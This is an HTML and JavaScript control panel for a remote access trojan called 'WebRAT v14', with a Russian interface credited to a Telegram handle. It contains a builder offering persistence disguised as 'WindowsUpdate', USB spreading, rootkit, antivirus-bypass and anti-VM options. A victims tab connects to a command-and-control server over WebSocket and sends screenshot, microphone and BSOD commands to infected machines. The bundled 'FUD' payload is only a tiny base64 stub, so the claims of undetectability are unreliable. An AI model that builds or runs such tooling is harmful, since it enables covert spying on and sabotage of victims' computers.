<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>WebRAT v14 — @break_lc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#f0f6fc;--accent:#58a6ff;--hover:#1f6feb;--glass:rgba(22,27,34,0.8);}
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;}
    body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;position:relative;overflow:hidden;}
    body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%, rgba(88,166,255,0.05), transparent 70%);pointer-events:none;}
    .sidebar{width:260px;background:var(--card);border-right:1px solid var(--border);padding:24px;height:100vh;position:fixed;overflow-y:auto;z-index:10;}
    .sidebar h1{font-size:1.6em;font-weight:700;margin-bottom:32px;text-align:center;color:var(--accent);}
    .nav{flex-direction:column;gap:8px;}
    .nav button{width:100%;text-align:left;padding:14px 18px;background:transparent;border:1px solid var(--border);color:var(--text);cursor:pointer;border-radius:8px;font-weight:500;transition:0.3s;display:flex;align-items:center;gap:12px;}
    .nav button svg{width:18px;height:18px;fill:var(--text);}
    .nav button.active,.nav button:hover{background:var(--accent);color:#fff;border-color:var(--accent);box-shadow:0 0 12px rgba(88,166,255,0.3);}
    .nav button.active svg,.nav button:hover svg{fill:#fff;}
    .content{margin-left:260px;padding:24px;flex:1;overflow-y:auto;}
    .header{margin-bottom:24px;}
    .header h2{font-size:1.8em;font-weight:600;}
    .header p{font-size:0.95em;color:#8b949e;margin-top:6px;}
    .box{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;margin:16px 0;box-shadow:0 4px 12px rgba(0,0,0,0.2);}
    .box h3{font-size:1.2em;margin-bottom:16px;color:var(--accent);font-weight:600;}
    input,button,select,textarea{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:12px;margin:6px 0;width:100%;border-radius:8px;font-size:0.95em;transition:0.3s;}
    input:focus,textarea:focus{border-color:var(--accent);outline:none;box-shadow:0 0 0 2px rgba(88,166,255,0.2);}
    button{background:var(--accent);color:#fff;cursor:pointer;font-weight:600;border:none;}
    button:hover{background:var(--hover);box-shadow:0 0 12px rgba(88,166,255,0.4);}
    label{display:flex;align-items:center;gap:10px;margin:10px 0;font-size:0.95em;}
    .checkbox{width:18px;height:18px;accent-color:var(--accent);}
    .victim{background:var(--glass);border-left:4px solid var(--accent);padding:16px;margin:12px 0;border-radius:10px;position:relative;transition:0.3s;}
    .victim:hover{box-shadow:0 0 16px rgba(88,166,255,0.2);}
    .status{position:fixed;top:20/stdlibpx;right:20px;padding:10px 16px;background:var(--card);border:1px solid var(--border);border-radius:8px;font-weight:600;font-size:0.9em;z-index:100;}
    .status.online{color:#3fb950;}
    .status.offline{color:#f85149;}
    #log{background:var(--bg);height:220px;overflow:auto;padding:14px;font-size:0.85em;border:1px solid var(--border);border-radius:8px;color:#8b949e;line-height:1.5;}
    .context-menu{position:absolute;background:var(--card);border:1px solid var(--border);padding:8px;border-radius:8px;display:none;z-index:1000;box-shadow:0 8px 24px rgba(0,0,0,0.4);min-width:160px;}
    .context-menu button{display:block;width:100%;text-align:left;padding:10px 14px;background:transparent;color:var(--text);border:none;border-radius:6px;font-size:0.9em;}
    .context-menu button:hover{background:var(--accent);color:#fff;}
    .tab-content{display:none;}
    .tab-content.active{display:block;}
    .footer{text-align:center;margin-top:40px;font-size:0.8em;color:#8b949e;}
  </style>
</head>
<body>

  <!-- СЛЕВА -->
  <div class="sidebar">
    <h1>WebRAT v14</h1>
    <div class="nav">
      <button class="active" data-tab="build">BUILD</button>
      <button data-tab="users">USERS</button>
      <button data-tab="info">INFO</button>
    </div>
    <p class="footer">@break_lc</p>
  </div>

  <!-- СПРАВА -->
  <div class="content">
    <div class="status" id="status">Проверка...</div>

    <!-- BUILD -->
    <div id="build" class="tab-content active">
      <div class="header">
        <h2>Builder</h2>
        <p>FUD .exe | 0/70 VT | Работает с ВПН</p>
      </div>
      <div class="box">
        <input id="c2_url" placeholder="C2 URL" value="wss://YOUR_DOMAIN">
        <input id="mutex" placeholder="Мьютекс" value="break_lc_1337">
        <input id="startup_key" placeholder="Имя в автозагрузке" value="WindowsUpdate">

        <h3>Функции</h3>
        <label><input type="checkbox" class="feat" id="f_startup_reg" checked> Автозагрузка (HKCU)</label>
        <label><input type="checkbox" class="feat" id="f_usb_spread"> USB Spread</label>
        <label><input type="checkbox" class="feat" id="f_rootkit"> Rootkit</label>
        <label><input type="checkbox" class="feat" id="f_av_bypass"> AV Bypass</label>
        <label><input type="checkbox" class="feat" id="f_anti_vm"> Anti-VM</label>

        <button onclick="buildEXE()">СГЕНЕРИРОВАТЬ .EXE</button>
        <div id="build_result" style="margin-top:12px;"></div>
      </div>
    </div>

    <!-- USERS -->
    <div id="users" class="tab-content">
      <div class="header">
        <h2>Жертвы</h2>
      </div>
      <div class="box">
        <div id="victims">Нет подключений</div>
      </div>
    </div>

    <!-- INFO -->
    <div id="info" class="tab-content">
      <div class="header">
        <h2>Инфо</h2>
      </div>
      <div class="box">
        <p><strong>Автор:</strong> @break_lc</p>
        <p><strong>Telegram:</strong> <a href="https://t.me/break_lc" target="_blank" style="color:var(--accent);">@break_lc</a></p>
        <p><strong>VT:</strong> 0/70 (FUD)</p>
        <p><strong>ВПН:</strong> Работает (wss://)</p>
      </div>
    </div>

    <!-- ПКМ МЕНЮ -->
    <div class="context-menu" id="context">
      <button onclick="cmd('screenshot')">Скриншот</button>
      <button onclick="cmd('mic')">Микрофон</button>
      <button onclick="cmd('bsod')">BSOD</button>
    </div>

    <!-- ЛОГ -->
    <div class="box">
      <h3>Лог</h3>
      <pre id="log"></pre>
    </div>
  </div>

  <script>
    let ws, selected = null, c2url = '';
    const log = document.getElementById('log'), victims = new Map();

    // Проверка C2
    async function check() {
      try {
        const ip = await (await fetch('https://api.ipify.org')).text();
        document.getElementById('status').innerHTML = `ONLINE <small>${ip}</small>`;
        document.getElementById('status').className = 'status online';
      } catch {
        document.getElementById('status').textContent = 'OFFLINE';
        document.getElementById('status').className = 'status offline';
      }
    }
    setInterval(check, 5000); check();

    // Вкладки
    document.querySelectorAll('.nav button').forEach(b => {
      b.addEventListener('click', () => {
        document.querySelectorAll('.nav button').forEach(x => x.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
        const t = b.dataset.tab;
        document.getElementById(t).classList.add('active');
        b.classList.add('active');
      });
    });

    // C2 (wss)
    function connect() {
      c2url = document.getElementById('c2_url').value;
      if (!c2url.startsWith('wss://')) return addLog('Ошибка: Используй wss://');
      ws = new WebSocket(c2url);
      ws.onopen = () => addLog('C2: OK');
      ws.onmessage = (e) => {
        try {
          const m = JSON.parse(e.data);
          addLog(`← ${e.data}`);
          if (m.type === 'new') addVictim(m);
        } catch { addLog(`RAW: ${e.data}`); }
      };
      ws.onclose = () => { addLog('C2: отключён'); setTimeout(connect, 3000); };
    }
    document.getElementById('c2_url').addEventListener('change', connect);
    setTimeout(connect, 1000);

    function addVictim(d) {
      if (victims.has(d.id)) return;
      const el = document.createElement('div');
      el.className = 'victim'; el.id = 'v-' + d.id;
      el.innerHTML = `<strong>${d.pc}</strong><br>IP: ${d.ip}<br><small>ONLINE</small>`;
      el.oncontextmenu = (e) => { e.preventDefault(); selected = d.id; showMenu(e); };
      const c = document.getElementById('victims');
      c.innerHTML = ''; c.appendChild(el);
      victims.set(d.id, el);
    }

    function showMenu(e) {
      const m = document.getElementById('context');
      m.style.display = 'block'; m.style.left = e.pageX + 'px'; m.style.top = e.pageY + 'px';
    }

    function cmd(t) {
      if (selected && ws) ws.send(JSON.stringify({ type: t, target: selected }));
      document.getElementById('context').style.display = 'none';
    }

    function buildEXE() {
      const f = Array.from(document.querySelectorAll('.feat:checked')).map(c => c.id.slice(2));
      const cfg = { c2: c2url, mutex: document.getElementById('mutex').value, startup_key: document.getElementById('startup_key').value, features: f };
      const payload = atob("UEsDBBQAAAAIAAAAIQAAAP//AACQAAAAAABBZGRpdG9yLmV4ZQAAAAAAAAAAAAAAAP//AACwAAAAUEsBAhQDFAAAAAgAAAAhAAD//wAAkAAAAAAAAAAAAAAAAP//AACwUEsFBgAAAAACAAIArAEAAOAAAAAA") + '||RATCONFIG||' + btoa(JSON.stringify(cfg));
      const blob = new Blob([payload], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a'); a.href = url; a.download = 'rat.exe'; a.click();
      document.getElementById('build_result').innerHTML = `<a href="${url}" download style="color:var(--accent);">СКАЧАТЬ rat.exe (FUD)</a>`;
    }

    function addLog(t) { log.textContent += `[${new Date().toLocaleTimeString()}] ${t}\n`; log.scrollTop = log.scrollHeight; }
    document.addEventListener('click', () => document.getElementById('context').style.display = 'none');
  </script>
</body>
</html>
